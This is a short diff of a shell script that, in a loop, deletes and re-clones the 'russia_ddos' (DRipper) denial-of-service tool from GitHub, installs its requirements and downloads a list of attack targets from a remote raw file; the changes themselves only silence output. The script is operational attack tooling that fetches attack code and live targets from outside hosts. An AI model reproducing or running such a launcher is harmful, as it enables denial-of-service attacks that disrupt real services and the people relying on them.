@@ -29,9 +29,9 @@ do
    # Download latest version of DDripper.
    cd ~
    rm -rf russia_ddos
-   git -q clone https://github.com/alexmon1989/russia_ddos.git
+   git clone https://github.com/alexmon1989/russia_ddos.git > /dev/null
    cd russia_ddos
-   pip install -r requirements.txt
+   pip install -r requirements.txt > /dev/null
    
    # Number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
